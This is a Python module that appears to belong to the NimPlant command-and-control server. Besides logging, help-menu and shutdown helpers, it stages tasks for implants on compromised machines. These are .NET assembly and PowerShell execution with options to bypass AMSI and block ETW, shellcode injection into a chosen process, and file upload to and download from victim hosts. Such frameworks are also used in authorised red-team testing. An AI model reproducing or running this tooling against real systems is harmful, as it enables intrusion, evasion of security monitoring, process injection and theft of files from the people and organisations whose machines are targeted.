import os, hashlib, json, sys
from datetime import datetime
from time import sleep
from zlib import compress

# Clear screen
def cls():
    if os.name == "nt":
        os.system('cls')
    else:
        os.system('clear')

# Timestamp function
timestampFormat = "%d/%m/%Y %H:%M:%S"
def timestamp():
    return datetime.now().strftime(timestampFormat)

# Log input and output to flat files per session
def log(message, target = None):
    from .nimplant import nps
    np = nps.getNimPlantByGuid(target)

    logDir = os.path.abspath(os.path.join(os.path.dirname(sys.argv[0]), "server", ".logs", f"server-{nps.name}"))
    os.makedirs(logDir, exist_ok=True)

    if target is not None and np is not None:
        logFile = f"session-{np.id}-{np.guid}.log"
    else:
        logFile = f"console.log"

    logFilePath = os.path.join(logDir, logFile)
    with open(logFilePath, "a") as f:
        f.write(message + "\n")

# Print function to properly direct output
def nimplantPrint(message, target = None):
    from .nimplant import nps
    np = nps.getNimPlantByGuid(target)
    if target is not None and np is not None:
        # Print to nimplant stream
        result = f"\x1b[1K\r[{timestamp()}|NP{np.id}] {message}"
    else:
        # Print to console stream
        result = f"\x1b[1K\r[{timestamp()}] {message}"

    log(f"[{timestamp()}] {message}", target)
    print(result)

# Cleanly exit server
def exitServer():
    from .nimplant import nps
    if nps.containsActiveNimPlants():
        nps.killAllNimPlants()
        nimplantPrint("Waiting for all NimPlants to receive kill command... Do not force quit!")
        while nps.containsActiveNimPlants():
            sleep(1)
        
    nimplantPrint("Exiting...")
    os._exit(0)

# Exit wrapper for console use
def exitServerConsole():
    from .nimplant import nps
    if nps.containsActiveNimPlants():
        check = str(input("Are you sure you want to exit? This will kill ALL active NimPlants! (Y/N): ")).lower().strip()
        if check[0] == 'y':
            exitServer()
    else:
        exitServer()

# Pretty print function
def prettyPrint(d, npguid):
    nimplantPrint(json.dumps(d, sort_keys=True, indent=2, default=str), npguid)

# Help menu function
def printHelpMenu(npguid):
    from .commands import getAvailableCommands
    nimplantPrint("NIMPLANT HELP", npguid)
    nimplantPrint("Argument quoting is supported. Arguments shown as [required] <optional>.", npguid)
    prettyPrint(getAvailableCommands(), npguid)

# Print the help text for a specific command
def printCommandHelp(npguid, command):
    from .commands import getAllAvailableCommands
    nimplantPrint("NIMPLANT HELP", npguid)
    nimplantPrint("Argument quoting is supported. Arguments shown as [required] <optional>.", npguid)
    nimplantPrint(f"Command: '{command}'", npguid)
    commands = getAllAvailableCommands()
    if command in commands:
        nimplantPrint(commands[command], npguid)

# Get the server configuration as a YAML object
def getConfigJson():
    from .nimplant import nps
    from .config import config
    res = {"GUID": nps.guid, "Server Configuration": config}
    return json.dumps(res)

# Handle pre-processing for the 'execute-assembly' command
def executeAssembly(np, args):
    from .crypto import encryptData

    amsi = "1"
    etw = "1"

    k = 1
    for i in range(len(args)):
        if args[i].startswith("BYPASSAMSI"):
            amsi = args[i].split("=")[-1]
            k += 1
        if args[i].startswith("BLOCKETW"):
            etw = args[i].split("=")[-1]
            k += 1

    try:
        filePath = args[k]
    except:
        nimplantPrint("Invalid number of arguments received. Usage: 'execute-assembly <BYPASSAMSI=0> <BLOCKETW=0> [localfilepath] <arguments>'.", np.guid)
        return

    if os.path.isfile(filePath):
        with open(filePath, "rb") as f:
            assembly = f.read()

        assembly = compress(assembly, level=9)
        assembly = encryptData(assembly, np.cryptKey)
        assemblyArgs = " ".join(args[k+1:])

        commandArgs = " ".join([
            amsi,
            etw,
            assembly,
            assemblyArgs])

        command = f"execute-assembly {commandArgs}"

        if np.getTask() is None:
            np.setTask(command)
            nimplantPrint("Staged execute-assembly command for NimPlant.", np.guid)
        else:
            np.setTask(command)
            nimplantPrint("Changed NimPlant command to execute-assembly.", np.guid)
    else:
        nimplantPrint("File to execute does not exist.")

# Handle pre-processing for the 'powershell' command
def powershell(np, args): 
    amsi = "1"
    etw = "1"

    k = 1
    for i in range(len(args)):
        if args[i].startswith("BYPASSAMSI"):
            amsi = args[i].split("=")[-1]
            k += 1
        if args[i].startswith("BLOCKETW"):
            etw = args[i].split("=")[-1]
            k += 1

    powershellCmd = " ".join(args[k:])

    if powershellCmd == "":
        nimplantPrint("Invalid number of arguments received. Usage: 'powershell <BYPASSAMSI=0> <BLOCKETW=0> [command]'.", np.guid)
        return

    commandArgs = " ".join([
        amsi,
        etw,
        powershellCmd])
 
    command = f"powershell {commandArgs}"

    if np.getTask() is None:
        np.setTask(command)
        nimplantPrint("Staged powershell command for NimPlant.", np.guid)
    else:
        np.setTask(command)
        nimplantPrint("Changed NimPlant command to powershell.", np.guid)

# Handle pre-processing for the 'shinject' command
def shinject(np, args):
    from .crypto import encryptData

    try:
        processId, filePath = args[1:3]
    except:
        nimplantPrint("Invalid number of arguments received. Usage: 'shinject [PID] [localfilepath]'.", np.guid)
        return

    if os.path.isfile(filePath):
        with open(filePath, "rb") as f:
            shellcode = f.read()

        shellcode = encryptData(shellcode, np.cryptKey)

        commandArgs = " ".join([
            processId,
            shellcode])

        command = f"shinject {commandArgs}"

        if np.getTask() is None:
            np.setTask(command)
            nimplantPrint("Staged shinject command for NimPlant.", np.guid)
        else:
            np.setTask(command)
            nimplantPrint("Changed NimPlant command to shinject.", np.guid)
    else:
        nimplantPrint("Shellcode file to inject does not exist.")

# Handle pre-processing for the 'upload' command
def uploadFile(np, args):
    if len(args) == 2:
        filePath = args[1]
        remotePath = ""
    elif len(args) == 3:
        filePath = args[1]
        remotePath = args[2]
    else:
        nimplantPrint("Invalid number of arguments received. Usage: 'upload [local file] <optional: remote destination path>'.", np.guid)
        return

    fileName = os.path.basename(filePath)
    fileId = hashlib.md5(filePath.encode('UTF-8')).hexdigest()

    if os.path.isfile(filePath):
        np.hostFile(filePath)
        command = f"upload {fileId} {fileName} {remotePath}"

        if np.getTask() is None:
            np.setTask(command)
            nimplantPrint("Staged upload command for NimPlant.", np.guid)
        else:
            np.setTask(command)
            nimplantPrint("Changed NimPlant command to upload.", np.guid)
    else:
        nimplantPrint("File to upload does not exist.")

# Handle pre-processing for the 'download' command
def downloadFile(np, args):
    if len(args) == 2:
        filePath = args[1]
        localPath = filePath.replace('/', '\\').split('\\')[-1]
    elif len(args) == 3:
        filePath = args[1]
        localPath = args[2]
    else:
        nimplantPrint("Invalid number of arguments received. Usage: 'download [remote file] <optional: local destination path>'.", np.guid)
        return

    np.receiveFile(localPath)
    command = f"download {filePath}"

    if np.getTask() is None:
        np.setTask(command)
        nimplantPrint("Staged download command for NimPlant.", np.guid)
    else:
        np.setTask(command)
        nimplantPrint("Changed NimPlant command to download.", np.guid)

# Get last lines of file
# Credit 'S.Lott' on StackOverflow: https://stackoverflow.com/questions/136168/get-last-n-lines-of-a-file-similar-to-tail
def tail(f, lines):
    total_lines_wanted = lines
    BLOCK_SIZE = 1024
    f.seek(0, 2)
    block_end_byte = f.tell()
    lines_to_go = total_lines_wanted
    block_number = -1
    blocks = []
    while lines_to_go > 0 and block_end_byte > 0:
        if (block_end_byte - BLOCK_SIZE > 0):
            f.seek(block_number*BLOCK_SIZE, 2)
            blocks.append(f.read(BLOCK_SIZE))
        else:
            f.seek(0,0)
            blocks.append(f.read(block_end_byte))
        lines_found = blocks[-1].count(b'\n')
        lines_to_go -= lines_found
        block_end_byte -= BLOCK_SIZE
        block_number -= 1
    all_read_text = b''.join(reversed(blocks))
    return b'\n'.join(all_read_text.splitlines()[-total_lines_wanted:])

def tailNimPlantLog(np = None, lines = 100):
    from .nimplant import nps
    logDir = os.path.abspath(os.path.join(os.path.dirname(sys.argv[0]), "server", ".logs", f"server-{nps.name}"))

    if np:
        logFile = f"session-{np.id}-{np.guid}.log"
        id = np.guid
    else:
        logFile = f"console.log"
        id = "CONSOLE"

    logFilePath = os.path.join(logDir, logFile)

    if os.path.exists(logFilePath):
        with open(logFilePath, 'rb') as f:
            logContents = tail(f, lines).decode('utf8')
    else:
        lines = 0
        logContents = ""

    return {"id": id, "lines": lines, "result": logContents}
